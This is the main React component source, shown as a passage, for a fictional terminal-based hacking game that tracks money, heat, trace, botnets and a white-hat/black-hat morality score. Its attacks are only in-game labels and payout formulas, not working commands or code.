import HelpMenu from './components/HelpMenu';
import AiSettings from './components/AiSettings';
import React, { useState, useRef, useEffect, useCallback } from 'react';
import SoundManager from './components/SoundManager';
import * as soundEngine from './audio/soundEngine';
import { generateDirectorText } from './ai/aiAdapter';
import {
  setSoundMap,
  playSuccess as _playSuccess,
  playFailure as _playFailure,
  playRootShell as _playRootShell,
  playExfil as _playExfil,
  playTraceWarning,
  playHeatSpike,
  playBeacon,
  playDestroy,
  playBlip
} from './audio/soundEngine';

// Sound + haptic wrappers (haptics no-op on desktop)
const playSuccess = () => { _playSuccess(); hapticSuccess(); };
const playFailure = () => { _playFailure(); hapticError(); };
const playRootShell = () => { _playRootShell(); hapticMedium(); };
const playExfil = () => { _playExfil(); hapticLight(); };
import {
  HOURLY_RATE,
  COLORS,
  generateMarketPrices,
  REGIONS,
  COMMODITIES,
} from './constants/gameConstants';
import {
  invokeBlueTeamAI,
  generateAIContract,
  generateInterceptedComms,
} from './ai/agents';
import {
  DEFAULT_DIRECTOR,
  evaluatePlayerSkill,
  computeDifficultyModifiers,
  getRewardMult,
  getMaxProxySlots,
  generateDirectorNarrative,
} from './ai/director';
import { generateNewTarget, DEFAULT_WORLD } from './world/generation';
import { SyntaxText, Typewriter, HelpPanel } from './components/TerminalBits';
import RigDisplay from './components/RigDisplay';
import NetworkMap from './components/NetworkMap';
import Header from './components/Header';
import ContractBoard from './components/ContractBoard';
import MarketBoard from './components/MarketBoard';
import DarknetShop from './components/DarknetShop';
import UnifiedMarket from './components/UnifiedMarket';
import { PARTS_BY_ID, getSellPrice, getRigEffects, generateUnifiedMarket, generateBTCPrice, formatBTC } from './constants/rigParts';
import { useMobile } from './hooks/useMobile';
import MobileTouchUI from './components/MobileTouchUI';
import { initNative, hapticLight, hapticMedium, hapticSuccess, hapticError } from './native';





const STEAMBREACH = () => {
 const [operator, setOperator] = useState('');
  const [screen, setScreen] = useState('intro');
  const apiKey = null;
  const [gameMode, setGameMode] = useState('arcade');
  const [terminal, setTerminal] = useState([]);
  const [input, setInput] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const { isMobile, isKeyboardOpen } = useMobile();
  const [showMobileKeyboard, setShowMobileKeyboard] = useState(false);
  const [mobileSelectedTarget, setMobileSelectedTarget] = useState(null);
  const [devMode, setDevMode] = useState(false);
  const [showHelpMenu, setShowHelpMenu] = useState(false);
  const [money, setMoney] = useState(0);
  const [reputation, setReputation] = useState(0);
  const [heat, setHeat] = useState(0);
  const [botnet, setBotnet] = useState([]);
  const [proxies, setProxies] = useState([]);
  const [looted, setLooted] = useState([]);
  const [wipedNodes, setWipedNodes] = useState([]);
  const [inventory, setInventory] = useState([]);
  const [rig, setRig] = useState({ cpu:null, gpu:null, ram:null, ssd:null, psu:null, cool:null, net:null, case:null });
  const [partsBag, setPartsBag] = useState([]);
  const [softwareOwned, setSoftwareOwned] = useState([]);
  const [hwMarketData, setHwMarketData] = useState(null);
  const [btcIndex, setBtcIndex] = useState(1.0);
  
  const [currentRegion, setCurrentRegion] = useState('us-gov');
  const [marketPrices, setMarketPrices] = useState(generateMarketPrices(currentRegion));
  const [stash, setStash] = useState({ cc_dumps: 0, botnets: 0, exploits: 0, zerodays: 0 });
  const [consumables, setConsumables] = useState({ decoy: 0, burner: 0, zeroday: 0 });
  
  const [world, setWorld] = useState(DEFAULT_WORLD);
  const [unlockedFiles, setUnlockedFiles] = useState([]);

  const [trace, setTrace] = useState(0);
  const [isInside, setIsInside] = useState(false);
  const [targetIP, setTargetIP] = useState(null);
  const [privilege, setPrivilege] = useState('local');
  const [currentDir, setCurrentDir] = useState('~');
  const [mapExpanded, setMapExpanded] = useState(false);

  const [isChatting, setIsChatting] = useState(false);
  const [chatTarget, setChatTarget] = useState('');
  const [chatHistory, setChatHistory] = useState([]);

  const [contracts, setContracts] = useState([]);
  const [activeContract, setActiveContract] = useState(null);

  const [menuMode, setMenuMode] = useState('main');
  const [deleteTarget, setDeleteTarget] = useState(null);
  const [menuIndex, setMenuIndex] = useState(0);

  const [wantedTier, setWantedTier] = useState('COLD');
  const [walletFrozen, setWalletFrozen] = useState(false);
  const [morality, setMorality] = useState({ chaos: 0, signal: 0 });
  const [activeStory, setActiveStory] = useState(null);
  const alignment = Math.max(-100, Math.min(100, morality.signal - morality.chaos));
  const [pendingInteraction, setPendingInteraction] = useState(null);

  const rigFx = getRigEffects(rig);
  const clamp = (n, min, max) => Math.max(min, Math.min(max, n));
  const getEconomyNodeValue = (ip = targetIP) => {
    const node = world?.[ip];
    if (!node) return 2500;
    if (typeof node.val === 'number' && node.val > 0) return node.val;
    const secBase = { low: 2500, mid: 9000, high: 30000, elite: 90000 };
    return secBase[node.sec] || 2500;
  };
  const getEconomyModeMult = () => 0.8 + (getRewardMult(gameMode) * 0.2);
  const getEconomyMarketMult = () => clamp(0.75 + (btcIndex * 0.35), 0.9, 1.5);
  const getHashRigMult = () => clamp(0.9 + (rigFx.hashSpeed / 12), 0.9, 1.8);
  const getExfilRigMult = () => clamp(0.9 + (rigFx.exfilMultiplier / 10), 0.9, 1.7);
  const getMineRigMult = () => clamp(0.75 + (rigFx.mineMultiplier / 3000), 0.75, 2.5);
  const getHeatRiskMult = (baseHeat = heat) => clamp(1 + ((100 - baseHeat) / 200), 1, 1.5);
 const generateStory = (ip, alignment) => {
  const stories = [
    {
      good_action: 'Patch the system and notify the employee',
      evil_action: 'Deploy ransomware and lock all files',
      good_payout: 5000,
      evil_payout: 25000,
      good_align: 10,
      evil_align: -15,
    },
    {
      good_action: 'Expose company corruption to the public',
      evil_action: 'Sell the data on the darknet',
      good_payout: 8000,
      evil_payout: 30000,
      good_align: 15,
      evil_align: -20,
    },
    {
      good_action: 'Help recover stolen credentials',
      evil_action: 'Hijack accounts and drain funds',
      good_payout: 4000,
      evil_payout: 20000,
      good_align: 8,
      evil_align: -12,
    }
  ];

  const pick = stories[Math.floor(Math.random() * stories.length)];

  return {
    ip,
    ...pick
  };
}; 
  const getEconomyPayout = ({
    ip = targetIP,
    action = 'generic',
    staged = false,
    distributedNodes = 0,
    isStrong = true,
    customTargetValue = null,
  } = {}) => {
    const targetValue = customTargetValue || getEconomyNodeValue(ip);
    const actionMult = {
      john: 0.18,
      hashcat: 0.28,
      exfil: 0.28,
      stash: 0.28,
      shred: 0.42,
      ransom_fast: 0.4,
      ransom_strong: 0.58,
      fence: 0.22,
      generic: 0.2,
    }[action] || 0.2;

    const rigMult = action === 'john' || action === 'hashcat'
      ? getHashRigMult()
      : action === 'exfil' || action === 'stash'
        ? getExfilRigMult()
        : action.startsWith('ransom')
          ? clamp((getHashRigMult() + getExfilRigMult()) / 2, 1, 1.7)
          : 1;

    const distributedMult = distributedNodes > 0 ? clamp(1 + (distributedNodes * 0.08), 1, 1.6) : 1;
    const stagingMult = staged ? 1.1 : 1;
    const volatilityMult = getEconomyMarketMult() * getEconomyModeMult() * getHeatRiskMult();
    const raw = targetValue * actionMult * rigMult * distributedMult * stagingMult * volatilityMult;

    const floors = {
      john: 1200,
      hashcat: 2500,
      exfil: 900,
      stash: 1200,
      shred: 1800,
      ransom_fast: 8000,
      ransom_strong: 15000,
      fence: 6000,
      generic: 1000,
    };

    return Math.max(floors[action] || 1000, Math.floor(raw));
  };
  const getMinerNodes = (lootList = looted) => lootList.filter(x => typeof x === 'string' && x.startsWith('xmrig_')).length;
  const getPassiveIncomeRate = (lootList = looted) => {
    const minerNodes = getMinerNodes(lootList);
    if (minerNodes <= 0) return 0;
    return Math.floor(minerNodes * HOURLY_RATE * getMineRigMult() * getEconomyMarketMult());
  };

  const [director, setDirector] = useState(DEFAULT_DIRECTOR);
  const directorRef = useRef(DEFAULT_DIRECTOR);

  const terminalEndRef = useRef(null);
  const inputRef = useRef(null);
        
         // Add state:
const [soundMap, setSoundMapState] = useState({});

// Pass to soundEngine whenever it changes:
useEffect(() => { setSoundMap(soundMap); }, [soundMap]);

  // --- AUTO-SCROLL AND FOCUS KEEPER ---
  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'auto', block: 'end' });
    }
    
    // Auto-focus input when terminal updates, but only if we're in the terminal screens
    if (!isProcessing && !showHelpMenu && (screen === 'game' || screen === 'login')) {
      inputRef.current?.focus();
    }
  }, [terminal, isProcessing, showHelpMenu, screen]);

  // --- INITIALIZE PLUGINS ---
  useEffect(() => {
    initNative();
  }, []);

  // ANDROID BACK BUTTON — intercept and route to in-game navigation
  useEffect(() => {
    const handleBack = (e) => {
      // Determine what "back" means based on current state
      if (screen === 'game') {
        if (showHelpMenu) { setShowHelpMenu(false); }
        else if (mapExpanded) { setMapExpanded(false); }
        else if (showMobileKeyboard) { setShowMobileKeyboard(false); }
        else if (isChatting) { /* let the game handle exit */ }
        else if (isInside) { /* don't auto-exit node — too dangerous */ }
        else { saveGame(`auto_${operator}`); setScreen('intro'); setMenuMode('main'); setDeleteTarget(null); setMenuIndex(0); }
      } else if (screen === 'hardware' || screen === 'shop' || screen === 'market' || screen === 'contracts' || screen === 'sounds') {
        setScreen('game');
      } else if (screen === 'soundmanager' || screen === 'aisettings') {
        setScreen('intro');
      } else if (screen === 'intro') {
        if (menuMode !== 'main') { setMenuMode('main'); setMenuIndex(0); setDeleteTarget(null); }
        else { return; /* let browser handle — actually exit */ }
      } else {
        return; /* unknown screen, let browser handle */
      }
      // Push a dummy state so the next back press has something to pop
      window.history.pushState({ steambreach: true }, '');
    };

    // Seed initial history entry
    window.history.pushState({ steambreach: true }, '');
    window.addEventListener('popstate', handleBack);
    return () => window.removeEventListener('popstate', handleBack);
  }, [screen, menuMode, showHelpMenu, mapExpanded, showMobileKeyboard, isChatting, isInside, operator]);

  // PERSISTENT FOCUS KEEPER — grabs focus back after any steal (desktop only)
  useEffect(() => {
    if (screen !== 'game' || isMobile) return;
    const focusKeeper = setInterval(() => {
      if (inputRef.current && !isProcessing && !showHelpMenu && document.activeElement !== inputRef.current) {
        // Don't steal focus from buttons, inputs, or active text selections
        const activeTag = document.activeElement?.tagName;
        const hasSelection = window.getSelection()?.toString().length > 0;
        if (activeTag !== 'BUTTON' && activeTag !== 'INPUT' && !hasSelection) {
          inputRef.current.focus();
        }
      }
    }, 500);
    return () => clearInterval(focusKeeper);
  }, [screen, isProcessing, showHelpMenu, isMobile]);

  useEffect(() => {
  const handleHardwareBack = () => {
    if (isChatting) {
      onCommand('exit'); // Close spearphish
    } else if (isInside) {
      onCommand('exit'); // Disconnect from server
    } else if (mapExpanded) {
      setMapExpanded(false); // Close map
    } else {
      // If at home screen, maybe show "Press again to quit"
    }
  };

  window.addEventListener('hardwareBack', handleHardwareBack);
  return () => window.removeEventListener('hardwareBack', handleHardwareBack);
}, [isChatting, isInside, mapExpanded]);

  const activeState = useRef({ heat, botnet, proxies, walletFrozen });
  useEffect(() => { activeState.current = { heat, botnet, proxies, walletFrozen }; }, [heat, botnet, proxies, walletFrozen]);

  // TRACE PULSE — vibrates faster as trace climbs (mobile only)
  useEffect(() => {
    if (!isMobile || screen !== 'game' || trace <= 20) return;
    // Interval: 2000ms at 25% → 400ms at 90% → 200ms at 100%
    const interval = trace >= 100 ? 200 : Math.max(300, 2500 - (trace * 25));
    // Vibration intensity: gentle at low, aggressive at high
    const vibMs = trace >= 80 ? [30, 40, 30] : trace >= 60 ? [20, 30] : [15];
    const id = setInterval(() => {
      try { navigator.vibrate?.(vibMs); } catch {}
    }, interval);
    return () => clearInterval(id);
  }, [isMobile, screen, trace]);


  const isCivilianNode = (ip = targetIP) => world?.[ip]?.org?.type === 'personal';
  const getMoralityRank = () => {
    const diff = morality.signal - morality.chaos;
    if (diff >= 25) return 'WHITE HAT';
    if (diff >= 8) return 'GREY HAT+';
    if (diff <= -25) return 'BLACK HAT';
    if (diff <= -8) return 'GREY HAT-';
    return 'NEUTRAL';
  };

  const buildCivilianInteraction = (filename, fileText = '', ip = targetIP) => {
    const node = world?.[ip];
    if (!node || node?.org?.type !== 'personal') return null;

    const key = `${ip}:${filename}`;
    const lower = `${filename} ${fileText}`.toLowerCase();

    if (lower.includes('freez') || lower.includes('broken') || lower.includes('problem') || lower.includes('help') || lower.includes('not working')) {
      return {
        id: key,
        kind: 'assist',
        title: 'HOUSEHOLD SUPPORT ISSUE',
        prompt: '[CHOICE] You found evidence the owner is struggling with a system issue. Type "assist" to quietly patch the problem and raise your SIGNAL rating.',
        signal: 4,
        chaos: 0,
        heatDelta: -2,
        rewardText: 'Signal +4 | Heat -2%',
      };
    }

    if (lower.includes('bank') || lower.includes('wallet') || lower.includes('password') || lower.includes('seed') || lower.includes('vpn')) {
      return {
        id: key,
        kind: 'salvage',
        title: 'HIDDEN OPPORTUNITY',
        prompt: '[CHOICE] This mailbox contains something useful. Type "salvage" to recover a small power-up or stash item.',
        signal: 0,
        chaos: 0,
        heatDelta: 0,
        rewardText: 'Potential power-up or bonus loot',
      };
    }

    return {
      id: key,
      kind: 'crash',
      title: 'UNPROTECTED CIVILIAN MACHINE',
      prompt: '[CHOICE] This endpoint is soft and exposed. Type "crashpc" to brick the machine and raise your CHAOS rating.',
      signal: 0,
      chaos: 5,
      heatDelta: 1,
      rewardText: 'Chaos +5',
    };
  };

  const clearPendingInteraction = () => setPendingInteraction(null);

  const getAllSaveSlots = () => {
    try { return JSON.parse(localStorage.getItem('breach_save_index') || '[]'); } catch { return []; }
  };

  useEffect(() => {
    const handleGlobalKey = (e) => {
      if (screen === 'game') {
        if (e.key === 'Escape') {
          if (showHelpMenu) {
            setShowHelpMenu(false);
          } else if (isInside || isChatting) {
            setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local'); setIsChatting(false);
            setTerminal(prev => [...prev, { type: 'out', text: '[*] Session dropped via [ESC].', isNew: true }]);
          } else {
            saveGame(`auto_${operator}`);
            setScreen('intro'); setMenuMode('main'); setMenuIndex(0);
          }
        }
        if (e.key === 'Tab') {
          e.preventDefault(); 
          setShowHelpMenu(prev => !prev);
        }
      }
    };
    window.addEventListener('keydown', handleGlobalKey);
    return () => window.removeEventListener('keydown', handleGlobalKey);
  }, [screen, isInside, isChatting, operator, showHelpMenu]);

 
  useEffect(() => {
    if (screen !== 'intro') return;

    const handleKeyDown = (e) => {
      const saves = getAllSaveSlots();
      
      if (menuMode === 'main') {
        const maxIdx = saves.length > 0 ? 2 : 0;
        if (e.key === 'ArrowDown') setMenuIndex(prev => Math.min(prev + 1, maxIdx));
        if (e.key === 'ArrowUp') setMenuIndex(prev => Math.max(prev - 1, 0));
        if (e.key === 'Enter') {
          if (menuIndex === 0) { setMenuMode('newgame'); setMenuIndex(0); setOperator(''); }
          else if (menuIndex === 1) { setMenuMode('load'); setMenuIndex(0); }
          else if (menuIndex === 2) { setMenuMode('delete'); setMenuIndex(0); }
        }
      } 
      else if (menuMode === 'load') {
        if (e.key === 'Escape') { setMenuMode('main'); setMenuIndex(0); }
        if (e.key === 'ArrowDown') setMenuIndex(prev => Math.min(prev + 1, saves.length - 1));
        if (e.key === 'ArrowUp') setMenuIndex(prev => Math.max(prev - 1, 0));
        if (e.key === 'Enter' && saves.length > 0) {
           const reversedSaves = saves.slice().reverse();
           loadGame(reversedSaves[menuIndex]);
           setScreen('game');
        }
      }
      else if (menuMode === 'delete' && !deleteTarget) {
        if (e.key === 'Escape') { setMenuMode('main'); setMenuIndex(0); }
        if (e.key === 'ArrowDown') setMenuIndex(prev => Math.min(prev + 1, saves.length - 1));
        if (e.key === 'ArrowUp') setMenuIndex(prev => Math.max(prev - 1, 0));
        if (e.key === 'Enter' && saves.length > 0) {
           const reversedSaves = saves.slice().reverse();
           setDeleteTarget(reversedSaves[menuIndex]);
           setMenuIndex(0); 
        }
      }
      else if (menuMode === 'delete' && deleteTarget) {
        if (e.key === 'Escape') { setDeleteTarget(null); setMenuIndex(0); }
        if (e.key === 'ArrowLeft' || e.key === 'ArrowRight') setMenuIndex(prev => prev === 0 ? 1 : 0);
        if (e.key === 'Enter') {
          if (menuIndex === 0) { setDeleteTarget(null); setMenuIndex(0); } 
          else { deleteSave(deleteTarget); setDeleteTarget(null); setMenuIndex(0); } 
        }
      }
      else if (menuMode === 'newgame') {
        if (e.key === 'Escape') { setMenuMode('main'); setMenuIndex(0); }
        const modes = ['arcade', 'field', 'operator'];
        const currentModeIdx = modes.indexOf(gameMode);
        if (e.key === 'ArrowDown') setGameMode(modes[(currentModeIdx + 1) % 3]);
        if (e.key === 'ArrowUp') setGameMode(modes[(currentModeIdx - 1 + 3) % 3]);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [screen, menuMode, menuIndex, deleteTarget, gameMode]);

  const collectCurrentState = () => ({
    operator, gameMode, money, reputation, heat, botnet, proxies, looted, wipedNodes,
    inventory, rig, partsBag, softwareOwned, btcIndex, consumables, stash, currentRegion, marketPrices, world, unlockedFiles, contracts, director, morality, pendingInteraction, timestamp: Date.now(),
  });

  const applySaveData = (data) => {
    if (data.operator) setOperator(data.operator);
    if (data.gameMode) setGameMode(data.gameMode);
    if (data.world && Object.keys(data.world).length > 0) setWorld(data.world);
    setBotnet(data.botnet || []);
    setProxies(data.proxies || []);
    setLooted(data.looted || []);
    setWipedNodes(data.wipedNodes || []);
    setInventory(data.inventory || []);
    setRig(data.rig || { cpu:null, gpu:null, ram:null, ssd:null, psu:null, cool:null, net:null, case:null });
    setPartsBag(data.partsBag || []);
    setSoftwareOwned(data.softwareOwned || []);
    setBtcIndex(data.btcIndex || 1.0);
    setConsumables(data.consumables || { decoy: 0, burner: 0, zeroday: 0 });
    setStash(data.stash || { cc_dumps: 0, botnets: 0, exploits: 0, zerodays: 0 });
    setCurrentRegion(data.currentRegion || 'us-gov');
    if (data.marketPrices) setMarketPrices(data.marketPrices);
    setUnlockedFiles(data.unlockedFiles || []);
    setContracts(data.contracts || []);
    if (data.director) { setDirector(data.director); directorRef.current = data.director; }
    setMoney(data.money || 0);
    setReputation(data.reputation || 0);
    setHeat(data.heat || 0);
    setMorality(data.morality || { chaos: 0, signal: 0 });
    setPendingInteraction(data.pendingInteraction || null);
  };

  const saveGame = (slotName) => {
    const state = collectCurrentState();
    localStorage.setItem(`breach_slot_${slotName}`, JSON.stringify(state));
    const index = getAllSaveSlots();
    if (!index.includes(slotName)) {
      localStorage.setItem('breach_save_index', JSON.stringify([...index, slotName]));
    } else {
      localStorage.setItem('breach_save_index', JSON.stringify([...index.filter(n => n !== slotName), slotName]));
    }
    return true;
  };

  const loadGame = (slotName) => {
    try {
      const data = JSON.parse(localStorage.getItem(`breach_slot_${slotName}`));
      if (!data) return false;
      applySaveData(data);
      const savedLoot = data.looted || [];
      const savedMinerNodes = savedLoot.filter(x => typeof x === 'string' && x.startsWith('xmrig_')).length;
      if (data.timestamp && savedMinerNodes > 0) {
        const hours = (Date.now() - data.timestamp) / (1000 * 60 * 60);
        const savedRigFx = getRigEffects(data.rig || { cpu:null, gpu:null, ram:null, ssd:null, psu:null, cool:null, net:null, case:null });
        const savedMineMult = clamp(0.75 + (savedRigFx.mineMultiplier / 3000), 0.75, 2.5);
        const savedMarketMult = clamp(0.75 + ((data.btcIndex || 1.0) * 0.35), 0.9, 1.5);
        const earned = Math.floor(hours * savedMinerNodes * HOURLY_RATE * savedMineMult * savedMarketMult);
        if (earned > 0) {
          setMoney(m => m + earned);
          setTerminal([{ type: 'out', text: `[SYSTEM] Offline mining revenue: +₿${earned.toLocaleString()} from ${savedMinerNodes} active miner node${savedMinerNodes > 1 ? 's' : ''}`, isNew: false }]);
        }
      }
      return true;
    } catch { return false; }
  };

  const deleteSave = (slotName) => {
    localStorage.removeItem(`breach_slot_${slotName}`);
    const index = getAllSaveSlots().filter(n => n !== slotName);
    localStorage.setItem('breach_save_index', JSON.stringify(index));
  };

  const startNewGame = (name, mode) => {
    setOperator(name);
    setGameMode(mode || 'arcade');
    setMoney(0); setReputation(0); setHeat(0);
    setBotnet([]); setProxies([]); setLooted([]); setWipedNodes([]);
    setInventory([]); setConsumables({ decoy: 0, burner: 0, zeroday: 0 }); 
    setRig({ cpu:null, gpu:null, ram:null, ssd:null, psu:null, cool:null, net:null, case:null });
    setPartsBag([]); setHwMarketData(null);
    setSoftwareOwned([]); setBtcIndex(1.0);
    setStash({ cc_dumps: 0, botnets: 0, exploits: 0, zerodays: 0 });
    setCurrentRegion('us-gov'); setMarketPrices(generateMarketPrices(currentRegion));
    setUnlockedFiles([]); setContracts([]);
    setWorld(DEFAULT_WORLD);
    setDirector(DEFAULT_DIRECTOR); directorRef.current = DEFAULT_DIRECTOR;
    setTerminal([]); setIsInside(false); setTargetIP(null);
    setPrivilege('local'); setCurrentDir('~'); setMapExpanded(false);
    setActiveContract(null);
    setWantedTier('COLD'); setWalletFrozen(false); lastWantedTier.current = 'COLD';
    setMorality({ chaos: 0, signal: 0 });
    setPendingInteraction(null);
    setScreen('game');
  };

  useEffect(() => {
    if (screen !== 'game' || !operator) return;
    const autoSaveTimer = setInterval(() => saveGame(`auto_${operator}`), 60000);
    return () => clearInterval(autoSaveTimer);
  }, [screen, operator, money, botnet, proxies, looted, wipedNodes, inventory, consumables, stash, currentRegion, world, contracts, director, heat, reputation, morality, pendingInteraction]);

  useEffect(() => { directorRef.current = director; }, [director]);

  useEffect(() => {
    if (screen !== 'game') return;
    const evalInterval = setInterval(async () => {
      const d = directorRef.current;
      const metrics = d.metrics;
      if (metrics.commandCount < 10) return;

      const newScore = evaluatePlayerSkill(metrics);
      const prevScore = d.skillScore;
      const newMods = computeDifficultyModifiers(newScore, inventory);
      const shifted = Math.abs(newScore - prevScore) > 10;
      let narrative = null;

      if (shifted && Date.now() - d.lastNarrativeTime > 120000) {
        const direction = newScore > prevScore ? 'harder' : 'easier';
        narrative = await generateDirectorNarrative(direction, newScore);
      }

      setDirector(prev => {
        const updated = {
          ...prev, skillScore: newScore, modifiers: newMods,
          metrics: { ...prev.metrics, lastEvalTime: Date.now() },
        };
        if (narrative) {
          updated.lastNarrativeTime = Date.now();
          updated.narrativeQueue = [...prev.narrativeQueue, narrative];
        }
        return updated;
      });
    }, 75000);
    return () => clearInterval(evalInterval);
  }, [screen, inventory]);

  useEffect(() => {
    if (director.narrativeQueue.length > 0 && !isProcessing && !isInside) {
      const msg = director.narrativeQueue[0];
      setTerminal(prev => [...prev, { type: 'out', text: `\n${msg}\n`, isNew: true }]);
      setDirector(prev => ({ ...prev, narrativeQueue: prev.narrativeQueue.slice(1) }));
    }
  }, [director.narrativeQueue, isProcessing, isInside]);

  const trackCommand = useCallback((cmd, success) => {
    setDirector(prev => {
      const m = { ...prev.metrics };
      m.commandCount++;
      if (!success) m.failedCommands++;
      m.commandTimestamps = [...m.commandTimestamps.slice(-19), Date.now()];
      return { ...prev, metrics: m };
    });
  }, []);

  const trackExploit = useCallback((success) => {
    setDirector(prev => {
      const m = { ...prev.metrics };
      if (success) {
        m.exploitsLanded++; m.exploitTimestamps = [...m.exploitTimestamps.slice(-9), Date.now()];
      } else m.exploitsFailed++;
      return { ...prev, metrics: m };
    });
  }, []);

  const trackRoot = useCallback(() => {
    setDirector(prev => {
      const m = { ...prev.metrics };
      m.rootsObtained++; m.rootTimestamps = [...m.rootTimestamps.slice(-9), Date.now()];
      return { ...prev, metrics: m };
    });
  }, []);

  const trackLoot = useCallback((amount) => {
    setDirector(prev => {
      const m = { ...prev.metrics };
      m.nodesLooted++; m.moneyEarned += amount;
      return { ...prev, metrics: m };
    });
  }, []);

  const trackTraced = useCallback(() => setDirector(prev => ({ ...prev, metrics: { ...prev.metrics, timesTraced: prev.metrics.timesTraced + 1 } })), []);
  const trackHoneypot = useCallback(() => setDirector(prev => ({ ...prev, metrics: { ...prev.metrics, timesHoneypotted: prev.metrics.timesHoneypotted + 1 } })), []);
  const trackContract = useCallback((completed) => {
    setDirector(prev => {
      const m = { ...prev.metrics };
      if (completed) m.contractsCompleted++; else m.contractsFailed++;
      return { ...prev, metrics: m };
    });
  }, []);

  useEffect(() => {
    let timer;
    if (isInside && !isChatting) {
      const baseTick = inventory.includes('Overclock') ? 2000 : 1000;
      const proxyBonus = proxies.length * 400;
      const directorMult = directorRef.current?.modifiers?.traceSpeedMult || 1.0;
      const traceSpeed = Math.floor((baseTick + proxyBonus) / directorMult);

      timer = setInterval(() => {
        const { heat: curHeat, proxies: curProxies } = activeState.current;
        if (curHeat > 80 && Math.random() < 0.03) {
          setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
          setTerminal(prev => [...prev.map(t => ({ ...t, isNew: false })), { type: 'out', text: `\n[!!!] ACTIVE THREAT HUNTING DETECTED [!!!]\n[-] Blue Team SOC Analyst manually severed the connection.\n`, isNew: true }]);
          trackTraced();
          return;
        }
        setTrace(prev => {
          // Play warning sound when trace crosses 75
          if (prev < 75 && prev + 1 >= 75) playTraceWarning();
          if (prev >= 99) {
            setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
            trackTraced();
            if (curProxies.length > 0) {
              const burned = curProxies[Math.floor(Math.random() * curProxies.length)];
              setProxies(p => p.filter(ip => ip !== burned)); setBotnet(b => b.filter(ip => ip !== burned));
              setWorld(w => { const nw = { ...w }; delete nw[burned]; return nw; });
              setTerminal(prev => [...prev.map(t => ({ ...t, isNew: false })), { type: 'out', text: `\n[!!!] TRACE COMPLETE: PROXY BURNED [!!!]\n[-] Traffic terminated at tunnel: ${burned}. You are SAFE.\n`, isNew: true }]);
            } else {
              setHeat(h => Math.min(h + 20, 100));
              playHeatSpike();
              setTerminal(prev => [...prev.map(t => ({ ...t, isNew: false })), { type: 'out', text: `\n[!!!] TRACE COMPLETE. CONNECTION SEVERED. HEAT +20% [!!!]\n`, isNew: true }]);
            }
            return 0;
          }
          return prev + 1;
        });
      }, traceSpeed);
    } else setTrace(0);
    return () => clearInterval(timer);
  }, [isInside, isChatting, inventory, proxies]);

  const escalateBlueTeam = useCallback((ip, amount) => {
    setWorld(prev => {
      const nw = { ...prev };
      if (nw[ip]?.blueTeam) {
        nw[ip] = { ...nw[ip], blueTeam: { ...nw[ip].blueTeam, alertLevel: Math.min(nw[ip].blueTeam.alertLevel + amount, 100) } };
        if (nw[ip].blueTeam.alertLevel > 60 && !nw[ip].blueTeam.activeHunting) {
          nw[ip] = { ...nw[ip], blueTeam: { ...nw[ip].blueTeam, activeHunting: true } };
        }
      }
      return nw;
    });
  }, []);

  // ==========================================
  // WANTED SYSTEM — HEAT CONSEQUENCE ENGINE
  // ==========================================
  const lastWantedTier = useRef('COLD');

  const getWantedTier = (h) => {
    if (h >= 90) return 'MANHUNT';
    if (h >= 75) return 'CRITICAL';
    if (h >= 50) return 'HOT';
    if (h >= 25) return 'WARM';
    return 'COLD';
  };

  const getHeatPriceMult = (h) => {
    if (h >= 90) return 2.0;
    if (h >= 75) return 1.75;
    if (h >= 50) return 1.5;
    if (h >= 25) return 1.25;
    return 1.0;
  };

  const WANTED_SIGINT = {
    WARM: [
      "[SIGINT] Interpol cyber division has opened a preliminary case file on unknown operator activity.",
      "[SIGINT] Darknet vendors are marking up prices — too many feds sniffing transactions in your region.",
      "[SIGINT] A Blue Team analyst posted your TTPs to a threat intel sharing platform. You're on their radar.",
    ],
    HOT: [
      "[SIGINT] FBI Cyber Division has escalated your case. Active investigation underway.",
      "[SIGINT] Blue Team forensics teams are tracing botnet C2 callbacks. Your infrastructure is exposed.",
      "[SIGINT] CISA issued an advisory matching your attack patterns. Corporate SOCs are hunting your beacons.",
      "[SIGINT] Dark web forums report a bounty on your operator identity. Watch your infrastructure.",
    ],
    CRITICAL: [
      "[!!!] INTERPOL RED NOTICE: Your digital fingerprint is flagged across all Five Eyes SIGINT networks.",
      "[!!!] Financial Intelligence Unit has frozen suspicious transaction channels. Wallet access restricted.",
      "[!!!] NSA TAO is actively deconstructing your proxy chain. Expect nodes to drop.",
      "[!!!] Joint cyber task force is triangulating your gateway. Proxy hops are being burned.",
    ],
    MANHUNT: [
      "[!!!] FULL MANHUNT: Every intelligence agency on the planet is hunting you.",
      "[!!!] ECHELON-class surveillance deployed. Your entire infrastructure is under coordinated attack.",
      "[!!!] Emergency CERT alert issued to all global SOCs. No safe harbor. Reduce heat or lose everything.",
    ],
  };

  useEffect(() => {
    if (screen !== 'game') return;
    const wantedTimer = setInterval(() => {
      const { heat: curHeat, botnet: curBotnet, proxies: curProxies } = activeState.current;
      const tier = getWantedTier(curHeat);
      const prevTier = lastWantedTier.current;

      // UPDATE TIER STATE
      setWantedTier(tier);
      setWalletFrozen(curHeat >= 75);

      // TIER TRANSITION — SIGINT MESSAGE
      if (tier !== prevTier && tier !== 'COLD') {
        const pool = WANTED_SIGINT[tier];
        if (pool) {
          const msg = pool[Math.floor(Math.random() * pool.length)];
          setTerminal(prev => [...prev, { type: 'out', text: `\n${msg}\n`, isNew: true }]);
        }
        // Heat spike sound on tier escalation
        if (['HOT', 'CRITICAL', 'MANHUNT'].includes(tier) && !['HOT', 'CRITICAL', 'MANHUNT'].includes(prevTier)) {
          playHeatSpike();
        }
        // CROSSING INTO CRITICAL — ANNOUNCE WALLET FREEZE
        if (tier === 'CRITICAL' && prevTier !== 'MANHUNT') {
          setTerminal(prev => [...prev, { type: 'out', text: `[!] WALLET FROZEN: Law enforcement has flagged your transaction channels.\n[!] Shop and market purchases DISABLED until heat drops below 75%.`, isNew: true }]);
        }
        // DROPPING OUT OF CRITICAL — ANNOUNCE THAW
        if ((tier === 'HOT' || tier === 'WARM' || tier === 'COLD') && (prevTier === 'CRITICAL' || prevTier === 'MANHUNT')) {
          setTerminal(prev => [...prev, { type: 'out', text: `[+] Financial channels re-opened. Wallet restrictions lifted.`, isNew: true }]);
        }
        lastWantedTier.current = tier;
      }

